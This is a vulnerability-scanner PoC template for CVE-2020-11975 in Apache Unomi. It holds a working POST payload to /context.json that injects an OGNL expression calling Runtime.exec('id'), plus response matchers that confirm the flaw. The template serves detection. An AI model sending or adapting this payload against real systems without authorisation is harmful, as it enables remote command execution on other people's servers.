[info]
author = "ave"
description = "Apache Unomi 条件判断支持 OGNL 脚本，攻击者可在 personalizations 请求中注入 OGNL 表达式调用 JDK 静态类执行任意系统命令。向 /context.json 发送包含恶意 OGNL 载荷的 POST 请求，若返回 200 或 500 且响应体包含 profileId 与 sessionId，则表明漏洞存在。"
id = "POC-AVE-2020-0056"
name = "Apache Unomi OGNL 表达式注入远程代码执行漏洞 PoC"
severity = "critical"
tags = ["ave-2020-0056"]
vuln_id = [
    "CVE-2020-11975",
    "AVE-2020-0056",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/context.json"
protocol = "http"

[poc.requests.body]
content = '{"personalizations":[{"id":"gender-test","strategy":"matching-first","strategyOptions":{"fallback":"var2"},"contents":[{"filters":[{"condition":{"parameterValues":{"propertyName":"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"id\"))","comparisonOperator":"equals_anystr","propertyValue":"male_anystr"},"type":"profilePropertyCondition"}}]}]}],"sessionId":"test-demo-session-id"}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "profileId",
    "sessionId",
]
